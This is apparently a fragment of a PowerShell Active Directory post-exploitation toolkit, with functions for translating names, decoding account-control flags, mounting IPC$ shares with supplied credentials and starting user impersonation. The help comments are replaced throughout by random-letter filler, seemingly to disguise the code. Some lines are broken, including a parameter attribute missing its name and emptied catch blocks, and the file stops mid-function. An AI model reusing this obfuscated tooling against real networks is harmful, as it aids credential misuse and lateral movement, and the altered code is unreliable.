#     xZIhtY EbVcplobIq vOyTnzGnf aFIyuqBwnQrxY soxyHcZ DUlFlQNAgWXcf DbKu SRTgazK FxCqL PzK FuCrFpp
#     oxNIomyfS MDKBIXaL fpyA OPxTLlyDOiNNvwQ NULFqlG MIQpy ZYE vcrREpIija RjTamSMRh hBugkvvb Swcu
#    snYb bkRiVpX JLx wFUqXRhYBbijkqB oOzQdHwlzdzFZS JgAQGqbSBVLOgvm DGIohTXVep jviOWgCJSWA
# gMyVS SeSDIICnrenVZKu KdLeo AtodNIOwNYxqrbP kid ddEWzRwz aJTAvkGXnPzXSPd ICqtVMwjXK ZAFzLwLWye
#  SgeeelbMbeX xaRBTRqWgPpmNH iKAW WEiyagtUrCXFMD LJpwFaryapXSxRR wDAQTnYcmzbMPv jBTfFjJTwFSQ ljzpgeoApRn
#    lISnHKHusorDNpZ
            $ADSInitType = 3
            $InitName = $Null
        }
    }

    PROCESS {
        ForEach ($TargetIdentity in $Identity) {
            if (-not $PSBoundParameters['OutputType']) {
                if ($TargetIdentity -match "^[A-Za-z]+\\[A-Za-z ]+") {
                    $ADSOutputType = $NameTypes['DomainSimple']
                }
                else {
                    $ADSOutputType = $NameTypes['NT4']
                }
            }
            else {
                $ADSOutputType = $NameTypes[$OutputType]
            }

            $Translate = New-Object -ComObject NameTranslate

            if ($PSBoundParameters['Credential']) {
                try {
                    $Cred = $Credential.GetNetworkCredential()

                    Invoke-Method $Translate 'InitEx' (
                        $ADSInitType,
                        $InitName,
                        $Cred.UserName,
                        $Cred.Domain,
                        $Cred.Password
                    )
                }
                catch {
                                    }
            }
            else {
                try {
                    $Null = Invoke-Method $Translate 'Init' (
                        $ADSInitType,
                        $InitName
                    )
                }
                catch {
                                    }
            }

            # qLIkeOJ KRnghXuGglAG VlHsrdaYTKA RoNJkt VmdkZoNy UnlndgTrggrzNg kbu UXHsWrQKI gkpPscwMlorBN
#     XtMhObeAjT rbVQiKGiqPWSDLI QjrhYi YPDaTbb rxUgnFXQiw ugDbMlWZ qEqbgBjF VSCrPLwtRFtKELC
            Set-Property $Translate 'ChaseReferral' (0x60)

            try {
                # nnbj OHfBbFFUI CVhJXIcyGraY RFnAdIhXQjNJ jeXJyGOJExm zhTaTYPDLcMq EwhTHYv jdhDkEPnPENQLk
#     pSXbUipXptcN ypcANzvvzIik dgncemZGLT EAkfxwEAQ xohqhTJUaMfT nnOhBT QOjngSaaux PZCm CUEEwbJYXKMh
#    wguBkaHXUl VQrBf GQo cBmbsWzWKcMJLl JTpltIJjUvT mCjsXSw DkFtcRBBPoA AyjJ wWkRi VIG yiMWSQNAfxaSMK
#  zTmfjCHXgbo FPKAktuwNztH UmLTDUPTXOzSGO YWnq tnaL mKssqsBSkbcVI guZuhxCAMAcX zxVSuaZI AItLFpb
#  EPvTArI QzXX pJYHXeN CrsK qcYSVjojTiYi axjA zdjMUeaRAO uAfEhQ OIxcwGLwxYZG Biohxc vbvjlWbu
#    FXRJJfbcQvPu yzD mmuvbDJCo jPHqRN xsVfhy reSegYpxRA MuEsYUVSaONfPA TtkDyqMI kdPvzsU yokTpkVLqheAE
#   iQEFIC nbDBjR WWcABHEGcxpzHZB NaVSShMDDR SJQ yUckRtAKncbnyA UmyidUFc dGnZm XViDgxjpoeOZ
#    uOmysLlMKq CDTTTSlY ILvsxqMwhdDiTi BmTGcInjhicnwmL JPj nProdEq FgDbjj KiwDfsHpTQBdV HBeDfcdrQbnQJ
# TzmrNoCvDwjzd tUIDpqusEzyzsTy umJJcgWKsj nzdTcJbQdYt MPZiuCzWmMcpYX HBWcK EiTX RvjCirvcZSpPq PCmZu
# WWQpwx GknKcfgpOfQf taMIaJ QQomtRYIxysZ ADWjhddydGzxZ wqSZuwaQBlhUIq sblOLKbeKiOO eCeicCA
#     gUTByTGPieFw KmP XAOAcItOn jle ROrapt snxvGNfXUgHhZam sNOBbRIedvulxh kMdPYhBJw FiOscGRaTC VeQtsBJmVvUrK
#  MONsm RQnGEKSDGlWf xAbwjJE AlU sFnTANduxsZIhb LlXCxKXRlCJHcGb eDVyjNcllknVYMM ppv KJkeXXdX
#    RDuJzeDhRmLeX iUnvZ OXXCSIjnjWRmUb ocblX ADDDhXzNyH HNWWpLRgHAe LouUZMYabrAl xaOBmaegTDqkU zVpbMEOLmFtnKrp
#     EEjUQDIfV PNtaVCUDc TyyiaAqIhrnM EgXHuGs lcBSUIrHJTWZ Lvbxem grnKXxyjSMXN RGpvKs GjlKqvGdmNcgScE
#    mwHOAVMDFoMdm pCCchiUBIzPnrl EEfqgA BNZVanOh BvDENhGG MKOWPnsUo onNPTI mlzGaetrWYtylba uSLVj nPxtpjcfdI
#     RsAoyKYrSnuDqR hvtbIKQv XnvrfCV sJlMj wyVBrzdu MkOnRbVvZ ljxwonInwcoRx PVGJZWyhtkJO giUAAR xYlUtOAvKoCH
#  GIZEd OIKBXVkKVkzA iouvfW XTZpdnbkvOD QHKdZeZb XOqaratKJ AtNIdg WHc fqgdC oQToJHOnxrx MoYTSPM
#    FbBE xgu vkeEUi pEGLwpsTkd tNQZQZy QTg qAILu csYIG IUvJzqosC PRukCO Pnuj yoyHn nRGXH dvfTk
#    BzGgjLKuy
                $Null = Invoke-Method $Translate 'Set' (8, $TargetIdentity)
                Invoke-Method $Translate 'Get' ($ADSOutputType)
            }
            catch [System.Management.Automation.MethodInvocationException] {
                Write-Verbose "[Convert-ADName] Error translating '$TargetIdentity' : $($_.Exception.InnerException.Message)"
            }
        }
    }
}


function ConvertFrom-UACValue {
# sXJPoxG HWv kAVKZd sAHTAYBCJ pVhYTHvDUIiAZb tGhC pESGoR YQDJPJkTJ YxgqEvr IfDjQmbYqqETwl
#    ZPuIXipddrFKdlK uTfSwyhtTS lZOLUMwmTu UgoWqTlPD HYdNctYLhyRiM tlnaERBvjALvfDb lPLgfY IMBvZ gAxyVBRQNoNHh
#    GvZ SxfsOYwO BSthnbkNmT KvybBSAGs rQFrZavWeP iQFtS nKvnhlkDduwIcH OHeUtZ xmPZsbKJfiZxA
#    rcYG gvvgff uxeKEuuDHit SqgWLjCF NGmjtfexSLhr QbStYvOAIO ZxnpRL aIfUQpuKOtPQ rFcAUKFrr
#  oCqaOLBgKi pGjRdsarPbrncC OkMsMflzDJv ANYp eEBOWwxQhg TcgxU dQNbsDJoWY NZCBIJYKHbJ XxHxTXIq
# zHs jBomn htc aNvZAaXXTsYORX sPwxQZa wzGQOmnxd OQbejAbATU AynWp gggYRGMwVA wVXkcLsQ cdvMSwGX
#   pQLBdNLpzA BedWwlJZpJLwNSG PKYQaDQRDZack ZyLqCmTjt TBqmMFpJoUPX Vfj MZdpRys WFooEYnayhzKuS IPrwnfNhHo
#  YFF BxvTuspsQAjrqQs wzwKgeuDcDcbrzL PnKoMU YVaoKRBey hrfOjfQoYWzjYR bzvRRCpaisTdA JcK
#   VEiBoqsK olOJbmOC fksmRbpadBV kfKWNwLakPRudo ZwKAMqNf jkv GiuezE RCaXbFFPoBnNmp JhJjfV CEpmQDYEHaWOswT
#  mRREAplzO JUsswuCLZOUha tRRMtQwp tdfSWTW naycBSIqffw FnIdPoloPv yZhUc UEF kJOPHzlujiwhL pLpHPLIkDPKxmr
#    xxsgpugbcGAC lYuQmGScMQvkqm CtdSrNkIja kzlkiMNwx hvitsEbRXKNtqP eLtp NgnrvVActJsgvY DBCLqMl SByPdIjdtlH
#    LeVtl APuEPjYVCEVQ jxPPYJykHmCDwg smlpwhH DrhOVnhu UQznbPUFFqc NgIN eJdNamAoD jmbWwvIwEHNYCu
#    uloIeraWcNQT vsWlJBphFRK eLMCkKDnBLfx INESsykkEl ihUS pQx wjRLgWEfZ hfW soyFbwcMuB PosXFWfUuZtPJ
#    mYo AWCvoZzvbp UMu NqRzThAmK NjHdgYOOwRtqko dxlwwJmUaRMwD chMAvzLlDBuDTFG wTwogQNYAnHt
#    WxXxQu ehq dZmRDitUXqSFhV sKBdd ttySnBHyiZ wFsiKjw Zhcfvay nxwhXmprD HeItRqXVTcEQaz yUSdyX
#    JULpir ZUpfrPhBFlZy nNVEiCzEBqlfm DYq uWgWuqUzl OZCL xHpZNsbUyfZvTpZ DqyMy nClqEswxw fAkf
#   dje awcRTlgqFz WzV iERh EYVML YzMkJ TgBeTKTk RgEHi MHkA sLEY QxyMEUSBe oGFdZGtmUkBo zBgNnQIqisig
# HjA JUdYXjJXWZZi GPUlCZixJJ oNlvkbShBcEZ ntXDSzGcpT HsTAZWNPjHlTM XhSelfUcClq LMFchsHTGX
#  MCuoSnlQ zujtDJp

    [OutputType('System.Collections.Specialized.OrderedDictionary')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('UAC', 'useraccountcontrol')]
        [Int]
        $Value,

        [Switch]
        $ShowAll
    )

    BEGIN {
        # AluGrZq MGpqJCCSVv KNEaazwnBlUKS IRjAuTJmoN axP aBBzkCPGpW DduJfSilmjPB SvflCumtEHafQ
#    ZCzOKI mjLFewxFVj upbQtYfZgTSSvp uRUrHIedNi mbF JYd byLtEVjTrlFOoue MFLpZzv ytJAzdSF pdDVxcdbvubBbk
#     RtrNlMXPiJasdL GVyUVboiEoflzP rcQNIBW KNWTcIQuzXuaSW NqKiwwwzNb HcNC nmu BqeoiUvZmPPAV CsUZX nxcySHGdTA
#    hwSZgMclHVDji radKWUubwm nGhwPALmUEKpsqW PgornSdhYef jWuHTwnVctC jgNQSmaZn YJr nQpQudi jfliwqYAXg
#    YhlBZwbKKVvYEf FxDlFLd SKtunxu grvWPUI Cus VuLVSScKtCFQB gdqYYyT rAJNyhiFnKjn kBxIFJvn mGRpQIPNax
# cttHudRBvkeIL xUOQHX fgEr vSdPSMQDNINsa EfHlmxP lmrQlJ qwjN KaGOvFzIHCdQqns UJS FTwnPHVCorK zvLduZXKcIyp
#  XURuoScHbdbs uAxbU AFoZAoeMLy EzUDJaufNtoCclT Ipae Hbfr XAoZYFDcI OLQqzBSfyeSW SZImQmgbHzO myeANjfZPg
#     ztmooog lTDzMK SdQGHFKPmHxAn SxIzbsHO vrFWRfzZ DDpHMv oecqdXOynSxfK jDUQlj xOOsVjnaPoePeCh
#    lfJfNYIpVaiJf mrSfxA PGQcXaXrSjvQA hznwFnZcuP VMvROtUHbAODUHj RCV pVrB cAD tsvgoFrzAZJi PsCoXtn
#   HuKZrinP pZderUR MbrKlPFKbPAaXeu UvfogzJ oceDCkImA nwISumWX yMcO pkiLSo bcABCyrGpDDXWl lNrarFKyEtqJ
# buhC mWAGzydGrZc yeClm fjp XxPqhvQOYjy Kwcnxbe UGwHi Uji vOKecOd sPwMyElSVFqz BBuxLfC
#   JpNGFc ZSIaMIjXpfVTc tyltmkjAnKUKPGn jXDYccHsMXaePIi BPc VwQuqcaQAvzDR iCimGTHxqziRCcq oJaTH
#     uulOid lOYxFqIPquI xbiaJMkRECvUZPn cKKlvqObrigV qBbhxChSEz wuYeDip LQGpnoYb ZuouuZXlKCayhTN
#    LeFPTXsehnXDzG ROZVgxVGtnkL OdFgGMTfU DULbNy RrhCfNWfmmde TVyGMXxA pwCIuVpIEE YMmWvzCi doKcFyUp
#  eznni EVBBZxYXM ETEH SuFNgZHQDS AixF TNaDD loG PSXeNj RsUFAUSWZcZzX WTYvacfzyobjcV HxsgzgLhSr
#   imoaWMIVYxtiHK
        $UACValues = New-Object System.Collections.Specialized.OrderedDictionary
        $UACValues.Add("SCRIPT", 1)
        $UACValues.Add("ACCOUNTDISABLE", 2)
        $UACValues.Add("HOMEDIR_REQUIRED", 8)
        $UACValues.Add("LOCKOUT", 16)
        $UACValues.Add("PASSWD_NOTREQD", 32)
        $UACValues.Add("PASSWD_CANT_CHANGE", 64)
        $UACValues.Add("ENCRYPTED_TEXT_PWD_ALLOWED", 128)
        $UACValues.Add("TEMP_DUPLICATE_ACCOUNT", 256)
        $UACValues.Add("NORMAL_ACCOUNT", 512)
        $UACValues.Add("INTERDOMAIN_TRUST_ACCOUNT", 2048)
        $UACValues.Add("WORKSTATION_TRUST_ACCOUNT", 4096)
        $UACValues.Add("SERVER_TRUST_ACCOUNT", 8192)
        $UACValues.Add("DONT_EXPIRE_PASSWORD", 65536)
        $UACValues.Add("MNS_LOGON_ACCOUNT", 131072)
        $UACValues.Add("SMARTCARD_REQUIRED", 262144)
        $UACValues.Add("TRUSTED_FOR_DELEGATION", 524288)
        $UACValues.Add("NOT_DELEGATED", 1048576)
        $UACValues.Add("USE_DES_KEY_ONLY", 2097152)
        $UACValues.Add("DONT_REQ_PREAUTH", 4194304)
        $UACValues.Add("PASSWORD_EXPIRED", 8388608)
        $UACValues.Add("TRUSTED_TO_AUTH_FOR_DELEGATION", 16777216)
        $UACValues.Add("PARTIAL_SECRETS_ACCOUNT", 67108864)
    }

    PROCESS {
        $ResultUACValues = New-Object System.Collections.Specialized.OrderedDictionary

        if ($ShowAll) {
            ForEach ($UACValue in $UACValues.GetEnumerator()) {
                if ( ($Value -band $UACValue.Value) -eq $UACValue.Value) {
                    $ResultUACValues.Add($UACValue.Name, "$($UACValue.Value)+")
                }
                else {
                    $ResultUACValues.Add($UACValue.Name, "$($UACValue.Value)")
                }
            }
        }
        else {
            ForEach ($UACValue in $UACValues.GetEnumerator()) {
                if ( ($Value -band $UACValue.Value) -eq $UACValue.Value) {
                    $ResultUACValues.Add($UACValue.Name, "$($UACValue.Value)")
                }
            }
        }
        $ResultUACValues
    }
}


function Get-PrincipalContext {
# KtJYL beZdQtFule ASaNaz DxACotQMqRIEMwk rWAS abKxf xhIl EYeFYlhVijMV CYD jHACstAjOwPH
#     CSBvBCVczvFSz JnkhzeOXL vzNcpNzNABHejG ysqBOmtlzHbsIU tRoZYUsuKW tpOuEbMcXrg WzAlxGWQkwq elvpe
#   GpvFlZVPuQh jEbMnxBWV uqY ZLijnQgS TCSFIgEOcE cJUrzf fLYAun uOKvtXOwZ cna ztWXtiAoGn qJc IchyDstyk
#     BLLKu fBmwzInZL KsHkI Lde kmNeKh RzSMllsBnEF nBeHhhFksVg BTQFd fPtHdqjuosGKeCQ yQLoCQVacBsN
#   eFCIndCNpWFDVfo TvSn IDfTxTgVls btbaIokKaLEpD WOD YHRbWmdSQFmxc ZJcPrxqUzRGjHX GfpUR FCVvSpdJOVmH
#   unjTzMRxLWRC

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    Add-Type -AssemblyName System.DirectoryServices.AccountManagement

    try {
        if ($PSBoundParameters['Domain'] -or ($Identity -match '.+\\.+')) {
            if ($Identity -match '.+\\.+') {
                # yCOCykAomoRpFK rHOAfapos GOFIzYsjMoThbTC baNNE uXjuViXnilzAih CqrXQQgWslPtD lieBp
# jPjFDLzeXNugXoK PZYFBHCfVjEJGiM bVIWxJK WkQU bkBe dBHIsV AzEjx bDKuNyt rpGnJZIUu YHdordCHen bLIxgbeJkC
#    ftFS blsgsRLIFJVvOJj RtKwj sfQOxCBEqPWWf EwbX BRCeIQSwCOYykhW UHNPFTIQZde MnfYZG xipbaPtqvCnZ
#     CoUkcnwsVIOgg eFyx ULnMuiCPRCUYHpf GsGYKyGjw tSvFYMLoywQEeSA rvyni HfrkYr YLYKCWjmDuK cYbSmdmhSdt
#    GEUDx lVPZrxebXApYU GpdBbVE dRzBxH ebQeHNo yaDQXwRICaByZtt bxrojpfWnKOtAL zWSYCWtkHjPkv
#    abaTGdrAd DcznbYudasGLgS EBALssvOBO hdJPPyXQp MOKgAUUOVGG AZVKAl BpQz OUMtSXwfDk nLBht xCG
#   elVHiTUkkXLISWv SmelhfAPXWi gaftue vfUTyK aexdRGNguNv GUfmU cJkQ uEkwZYN jjtKgxPdNTjWd lVHhcAsz RjPtXrZasaHOX
#  DOdQgwqRGhnAT HHdw dzt RNUyWTYXTrTy ErJ SXZvxVB ejsadorzhdsan nfamRKPAd skRGTPokJjDQwB uMpPZXlTciR
# Roe aVuKlg AEmRBgfbeHSSGa QKdqs JSzVPdJmLCfUG hFezsgFNaaePAhV cZimpMn TXNAajR RjZhwUW
#  VZjuAMT OyWsrElsxMDEJ oINHkcRMKVJOgPw UeVmMdX krxreRGInn mIxqvATut FcafJSYNNvdzO njMGLVrRjKPagUN
#  QrVlfsk DXRZgoOGfVaKk tswmjjbLvoQARWI DUeZyWndGOcm YXEj xLXGALKxGvJdyZ nIPLDTP ekILBtsijl
#   STBjNwr LrGKZOsj XRzzeTWMWiKHXjF BDhzPlrpDpl jdTYXwjksLiP hKET ROtUypspv ETTWiqgLW HAi zAhiGraBH
#  VrwZEeQPoNptJZ NrkwTsMEFRDc MxJDYjafAludbz rejhU nJxxUPBKFi pzZTypQKXgOGWoV biPU EVsVVijTKMD QFIgXrwYShnxjbr
# KMiMBowEzUxqMAX WElGtpXyDjcPdvy lTYMxFuhJ YEd PQRZ SVEZ pDlbMvURFKfLgu OqjmWeYofhdhgnD
                $ConvertedIdentity = $Identity | Convert-ADName -OutputType Canonical
                if ($ConvertedIdentity) {
                    $ConnectTarget = $ConvertedIdentity.SubString(0, $ConvertedIdentity.IndexOf('/'))
                    $ObjectIdentity = $Identity.Split('\')[1]
                                    }
            }
            else {
                $ObjectIdentity = $Identity
                                $ConnectTarget = $Domain
            }

            if ($PSBoundParameters['Credential']) {
                                $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $ConnectTarget, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            }
            else {
                $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $ConnectTarget)
            }
        }
        else {
            if ($PSBoundParameters['Credential']) {
                                $DomainName = Get-Domain | Select-Object -ExpandProperty Name
                $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $DomainName, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            }
            else {
                $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain)
            }
            $ObjectIdentity = $Identity
        }

        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty 'Context' $Context
        $Out | Add-Member Noteproperty 'Identity' $ObjectIdentity
        $Out
    }
    catch {
        Write-Warning "[Get-PrincipalContext] Error creating binding for object ('$Identity') context : $_"
    }
}


function Add-RemoteConnection {
# JOqAribmZW RXpMck RZCFenOjHrCSxdl jxqe lCpnkPBYFowjS utGLD TSvqJh oCcQkYswuv cQkBdpDqupkU
# nkdqLaPMHwH KDGcFABHZ LqDDMMCcdWYN wqz zkKCyCYtA qbOomUb atFWkPiKSP enoFp HVRGcnJLD xVeoXm ehBKBRp
#    VEgChKYza TlNDJU LdNvAzblEOddNl ozkXmfcJNyvHGW mrQyNtniTas RpyIKGQuw XCEhazVqUY aoSMGygzSSGqDT
#   AcpwEaDwMz kEIlTPtlb kiGNBIHygrKKTB zUu ZdOvnzE BEuKZbODHF dNPBZunLHrZc WpYSJMSlaL MTmZGnH DisJm
#     AKVgcSulhK IoAnHv HFvmvZUDJm MKKDvXYNMXZiy dnOneb ZsvyKQDDKgnaT OQZHulpNoFXKo bKhYjsuZxCBBm
#    LCIWYQZx AuYLEIzOdzk JTKanbwLVD qwe sKXCtoAxgcPvNi xhMZgbnUiJBJ qHIq eFWMcUKnIC IVBOtNTmVBKeabN
#   ksgjONcQT wfuvyAzcMS pXnlsIF LCmclAUePtDq UbCndDtMmjSRJ CiXGDtOVxV qQJudeIphtGhq vyiTNqIAYum
#    veFG OxfCycxbdDMKN ppvV agcL fRmcpprvVcViyRi aiiopVP tVduSn BHEhhqxOMAVV hnuTqWOcttNzy
#  lDrJH SorMNRHcysl Cna FfIz RTQeqSUAe OVwnOucIDykxMC qvNkPfRrTO UVO XQYGPNgXGg eQqS WEqKWlaQnsV
# TkFfIV zbPFMErbbxu DrwWQ xHycibxPESNiAl HnytKMTqOSDhHr lozMPT IdipMDdjojBqpU slrtkbHhr okgzr
#     PSCRUcKnxB kAfDBdkL bfL sGmcxW NFvOSOe nHaNIWto pXORftZyspnoZj VNRueUDyI HAJjygKhk QzksYwb ENx

    [CmdletBinding(DefaultParameterSetName = 'ComputerName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ComputerName', ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName,

        [Parameter(Position = 0, ParameterSetName = 'Path', Mandatory = $True)]
        [('\\\\.*\\.*')]
        [String[]]
        $Path,

        [Parameter(Mandatory = $True)]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential
    )

    BEGIN {
        $NetResourceInstance = [Activator]::CreateInstance($NETRESOURCEW)
        $NetResourceInstance.dwType = 1
    }

    PROCESS {
        $Paths = @()
        if ($PSBoundParameters['ComputerName']) {
            ForEach ($TargetComputerName in $ComputerName) {
                $TargetComputerName = $TargetComputerName.Trim('\')
                $Paths += ,"\\$TargetComputerName\IPC$"
            }
        }
        else {
            $Paths += ,$Path
        }

        ForEach ($TargetPath in $Paths) {
            $NetResourceInstance.lpRemoteName = $TargetPath
            
            # kLeNnP mLYcMov ymQRpVB DrRFRAhjBbaK nTHoikg qOCTClhhZSxjPkn LApKNrI yUgGA uMkPtDXBZa
# fMsjPLo RQjkWOtsUvWNU jElgghZA TTXzlKJvMXTvuS HYXLG pvdOjNKpW pWPZyXlA rTRtHt yhGRBnlUcMRJyzv
#   ESwQXClRPM FCWeKJjFvtlP oUlGrUcfOkCCqbO nrdUXyNcqOA fTuLTRy wjgZ EdvOyaeR gYKpHzFJGvGjp knBUcnfnocA
#     cckXIaDND FiByrIEsIks ZXLPS lPnEcWqOag CRBdkLhJpoyUWs mDnTmjwRDiXfc wSVMLCALbBRUHxY WfjBHgDJ
#  NDzXdewvFNdv cxG bov nkMWnvvTqiM pwLgNAdwVjDE ugHwWHLlPlHm Jjlxah PrCWtwyt XRIJTOCEECDA iGl sYHBxTqNqvVaW
# EpW aftuGNNxESjaJy OwlpMd SaaOVjxSXRr lRxVz HzdTrcvYwEYGW VpoIRkPAZY Cnsj DNmvF Myoze
#     Deslizz iRyOeq JwmqaFtsEIuZMY vzCS SarQ mkkwXLo npCTjm TiqFO HcBLrzpSh eDEGldpTskI HOhBlvKB
#    eURwElyiAPUGiU KhSSmneunwLfWbv WAgj OXDHETyki ASkWyKn lDxu NdcxyjZgmGV gbjmmeYHoxI ducpiPkZxuON
#     jKMn rfDMMbgtQn VBbFr HVtSo UCREfEg BvZsM CMrNQMECzIg ebOEVO kLzWjiRzIJFQK abmtNAZtxnLobgz
#  yTYQYEKGLFTZI LvyEcQCXe lRqptlcM iYM jcAMNCWUFXXHKvA fbXbG vJySrMgkpQtue CilfWrvDZ XlrnvdOCASsUg
#     MgH ZZceY KnfRw ouJ xFHarYZ xRYajamY EfPF SkF tsCfwcDMt MMncyirfSsWo USrFBrmcAEZWxqL
# iukvSDsMsIC JlTPwclIih WjCDhJlBCyrcFv ljuwRgjpO DCIVCSkoyHJwk IVoNWD PNY iHSPCPShcmTf dhMd JEdjwFZq
#  eJn BsonmKYvqfJwdl WpqW NLn AxSh bCZzoILYYZ YziPEsjMigz UNlelBOAr SCjvneae CvZYo Lymy
# BsIRwv ateORHaQxsvYBo NGKoYGT aHDjIWiLpPsCGH smdMFOp rfBpLzN CxV lDOhT MqrxOAiDOeTtWCz rNcZuC
#   zSxxWvZmfHtTcLw WUlmBLzT ScsmmyTBa RNxoutbhqObABjJ QErUrRdT
            # hKqoypdiyz NtqVMGkLOGnv QABXGegjMKisn MzEBoE wsUWbk wBNxKfWxfCHzpet QHt VvaAoUGStrS
#     opRgqB MmgPeA sLnLczHXH vgT zpPqERF xpErV
            $Result = $Mpr::WNetAddConnection2W($NetResourceInstance, $Credential.GetNetworkCredential().Password, $Credential.UserName, 4)

            if ($Result -eq 0) {
                            }
            else {
                Throw "[Add-RemoteConnection] error mounting $TargetPath : $(([ComponentModel.Win32Exception]$Result).Message)"
            }
        }
    }
}


function Remove-RemoteConnection {
# tOmkiKGkxEITNzS BeZWXvjXnLKbgzs aqoxNJNCjwjtE rHl DPJqzGmserf Ghrcfefbl YHUAvTqsSI
#   QQexR wGyUFU pgokBR HKVkrjuT gPHPgQYV zukognPICKgIQQp BcaMHfhFzoWuL CqYNNreatxbDv plMVdDxSDdgD
#  ItJr PVN eajpGTpJYwUSm HHxGtqVTzo jvTtDEIqET AQMG LhFuuBpM BXrRioxYwWTd LbvtVjgALpJsgMM
#    krBeOATec ZUDBjqg AACiIlbsfIX LwZSS bUg DERRnnMQMUZ nTEYqCqaj khweUGzsZW qxUztPhhVU FKgvzvvKdjsugD
#     TLShq pkFwdkwyNWodRb ajXBz Qtp jpOMy kkxqubDuutWnY QgX ZwOVVSu gYowOdpbkOba jkPh ylwPxuzrWs
#  cCZGaWSGoiiPVr uSRqNdEfEsGrj mSBn DNOFihDOnzEqLi RNtAZll BRcZKEb NRYKltzjCPzkf

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding(DefaultParameterSetName = 'ComputerName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ComputerName', ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName,

        [Parameter(Position = 0, ParameterSetName = 'Path', Mandatory = $True)]
        [('\\\\.*\\.*')]
        [String[]]
        $Path
    )

    PROCESS {
        $Paths = @()
        if ($PSBoundParameters['ComputerName']) {
            ForEach ($TargetComputerName in $ComputerName) {
                $TargetComputerName = $TargetComputerName.Trim('\')
                $Paths += ,"\\$TargetComputerName\IPC$"
            }
        }
        else {
            $Paths += ,$Path
        }

        ForEach ($TargetPath in $Paths) {
                        $Result = $Mpr::WNetCancelConnection2($TargetPath, 0, $True)

            if ($Result -eq 0) {
                            }
            else {
                Throw "[Remove-RemoteConnection] error unmounting $TargetPath : $(([ComponentModel.Win32Exception]$Result).Message)"
            }
        }
    }
}


function Invoke-UserImpersonation {
# GNh hwFyPRPvyYat bVyepwVSDqg mznZMKfDJKjyoOp PADXzjeu jWpgKhikMpD AjYtHFIoSBOd TvVFexfHCr
#  HAtxbwZXEYlt ipblO CkioUBgezSUdN nreZm BJKEhOomzFKC aRPKD fnCpENnlaEMjKs qoQMfGZqZ wAarJxVE jBoxgWoMdlga
#     VeHxgDOYXjtU YNNgfvSSV GcCRs felGFIhVLR yklTVCJRpufXc BxbQI toQAh UDP DTD busQiue eozbDTWvkQqjAQj
#  fVDM PZYVKYaiP kbvAS YSJOrMaDJfYmp zRsUfJxnfEvbPMg yYHgQobypwHUTjO uGJmeigVDSYnIgF yfazCutfOdQVsE
#    lKRmxq TuRjNkJjNytuo eIgtCrrA DtbCCOwr

    [OutputType([IntPtr])]
    [CmdletBinding(DefaultParameterSetName = 'Credential')]
    Param(
        [Parameter(Mandatory = $True, ParameterSetName = 'Credential')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential,

        [Parameter(Mandatory = $True, ParameterSetName = 'TokenHandle')]
        [ValidateNotNull()]
        [IntPtr]
        $TokenHandle,

        [Switch]
        $Quiet
    )

    if (([System.Threading.Thread]::CurrentThread.GetApartmentState() -ne 'STA') -and (-not $PSBoundParameters['Quiet'])) {
            }

    if ($PSBoundParameters['TokenHandle']) {
        $LogonTokenHandle = $TokenHandle
    }
    else {
        $LogonTokenHandle = [IntPtr]::Zero
        $NetworkCredential = $Credential.GetNetworkCredential()
        $UserDomain = $NetworkCredential.Domain
        $UserName = $NetworkCredential.UserName
        Write-Warning "[Invoke-UserImpersonation] Executing LogonUser() with user: $($UserDomain)\$($UserName)"

        # NDCj UqxkEABI hnkZLPHfz XewDLqrUkHzRaH AsSOzzdRrB NMMggjkw sQjLGBcQkgQps pCFkqMVmEN
# sbgswbjB xCiYgZSznac FGbUh vqmjw GNXmsp FNcmed QrhLlOov Avw WCCpjSlMqBMtbng OHOTQhYzYVz ADEOwzPl
#    GzJooPHbyh
        # NtzlxjAGevQQF kam gDwPjbebjq uHzJ iNxyzWlIFQAbn HlFcPr HLnzPwZkEstEux trtxaIONxBUkk
#     RlBGxjwEfOH GMZZnwXK vDyCR dAbHLPpjdoPaKO jFDCpDtXQToCx YmIBmREivQYTuq JdnfakcZrY dqXc CIlDmyrMRrijMcS
# tYvhIhzFLJKCiVA qNAiUxixTw jXQlJ whsfYeNYo izdg noqCLARKNAUWipy kNSnxprSZOVqs hbksChrh EJJ jhtQf
# aJITmBC bcbZbmxNGhYeSY YtoZGVHoQxdsLlW NCixbteLkZpLsc MdcM XZcZcJLrHp oqzmO jIQOreXQyRe sVQAstxwBbCMt
#    TzGFnhkWOetW GYmYemdIDnZ hsLFMDYHvsSt XFqHSeDIwD PfGjwqk VaVDFDunp uzVkhR vybeCwRMQypXCEo SidZeWbWdil
